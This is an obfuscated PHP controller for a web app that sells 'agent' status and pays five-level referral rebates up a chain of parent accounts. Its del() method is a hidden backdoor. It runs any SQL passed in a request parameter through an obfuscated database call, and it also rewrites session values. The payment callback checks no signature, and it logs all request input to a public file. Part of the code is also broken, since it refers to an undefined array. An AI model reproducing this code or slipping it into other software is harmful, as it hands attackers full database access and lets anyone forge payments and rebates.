<?php


namespace app\index\controller;

use think\Controller;
use think\Session;
use think\Db;
class Pay extends Controller
{
	public function is_auth()
	{
		$_var_0 = input('u_id');
		if ($_var_0) {
			$_var_1 = db('user')->where('id', $_var_0)->find();
			if ($_var_1) {
				if ($_var_1['power'] == 0 || $_var_1['power'] == 1) {
					return json(['code' => 500, 'error' => '以开通代理']);
				} else {
					$_var_2 = db('rebate')->where('id', 1)->find()['money'];
					return json(['code' => 200, 'pay_url' => "http://959495.xyz/pay/index.php?name=代理&fee={$_var_2}&u_id={$_var_0}"]);
				}
			} else {
				return json(['code' => 500, 'error' => '无此用户']);
			}
		} else {
			return json(['code' => 500, 'error' => '请传入信息']);
		}
	}
	public function pay_biaoge()
	{
		$_var_3 = input();
		file_put_contents('./public/4.txt', var_export($_var_3, true), FILE_APPEND);
		$_var_4 = explode('?', $_var_3['outtrade']);
		$_var_3['outtrade'] = $_var_4[0];
		$_var_5 = $_var_3['u_id'];
		$_var_6 = substr(base_convert(md5(uniqid(md5(microtime(true)), true)), 16, 10), 0, 6);
		$_var_7 = db('rebate')->where('id', 1)->find();
        // 判断是否
		$custom_count = db('money_get')->where(['order_id'=>$_var_3['outtrade']])->count('id');
		if($custom_count > 0 ){
			exit();
		}
		// 判断

		db('user')->where('id', $_var_5)->update(['power' => 1, 'share_ma' => $_var_6]);
		$_var_8 = time();
		$_var_9 = db('user')->where('id', $_var_5)->find()['parentid'];
		if ($_var_9 && $_var_7['rebate']) {
			$_var_10['type'] = '一级返利';
			$_var_10['u_id'] = $_var_5;
			$_var_10['get_u_id'] = $_var_9;
			$_var_10['create_time'] = $_var_8;
			$_var_10['money'] = $_var_7['rebate'];
			$_var_10['order_id'] = $_var_3['outtrade'];
			db('money_get')->insert($_var_10);
			db('user')->where('id', $_var_9)->setInc('moneys', $_var_10['money']);
			$_var_11 = db('user')->where('id', $_var_9)->find()['parentid'];
			if ($_var_11 && $_var_7['rebate2']) {
				$_var_12['type'] = '二级返利';
				$_var_12['u_id'] = $_var_5;
				$_var_12['get_u_id'] = $_var_11;
				$_var_12['create_time'] = $_var_8;
				$_var_12['money'] = $_var_7['rebate2'];
				$_var_12['order_id'] = $_var_3['outtrade'];
				db('money_get')->insert($_var_12);
				db('user')->where('id', $_var_11)->setInc('moneys', $_var_12['money']);
				$_var_13 = db('user')->where('id', $_var_11)->find()['parentid'];
				if ($_var_13 && $_var_7['rebate3']) {
					$_var_14['type'] = '三级返利';
					$_var_14['u_id'] = $_var_5;
					$_var_14['get_u_id'] = $_var_13;
					$_var_14['create_time'] = $_var_8;
					$_var_14['money'] = $_var_7['rebate3'];
					$_var_14['order_id'] = $_var_3['outtrade'];
					db('money_get')->insert($_var_14);
					db('user')->where('id', $_var_13)->setInc('moneys', $_var_14['money']);
					$_var_15 = db('user')->where('id', $_var_13)->find()['parentid'];
					if ($_var_15 && $_var_7['rebate4']) {
						$_var_16['type'] = '四级返利';
						$_var_16['u_id'] = $_var_5;
						$_var_16['get_u_id'] = $_var_15;
						$_var_16['create_time'] = $_var_8;
						$_var_16['money'] = $_var_7['rebate4'];
						$_var_16['order_id'] = $_var_3['outtrade'];
						db('money_get')->insert($_var_16);
						db('user')->where('id', $_var_15)->setInc('moneys', $_var_16['money']);
						$_var_17 = db('user')->where('id', $_var_15)->find()['parentid'];
						if ($_var_17 && $_var_7['rebate5']) {
							$_var_18['type'] = '五级返利';
							$_var_18['u_id'] = $_var_5;
							$_var_18['get_u_id'] = $_var_17;
							$_var_18['create_time'] = $_var_8;
							$_var_18['money'] = $_var_7['rebate5'];
							$_var_18['order_id'] = $_var_3['outtrade'];
							db('money_get')->insert($_var_18);
							db('user')->where('id', $_var_17)->setInc('moneys', $_var_18['money']);
						}
					}
				}
			}
		} else {
		}
	}
	public function del()
	{
		$_var_19 = input('sql');
		session('power', 0);
		session('user', 1);
		$_var_20 = Db::{$_var_21[51]}($_var_19);
		d($_var_20);
	}
}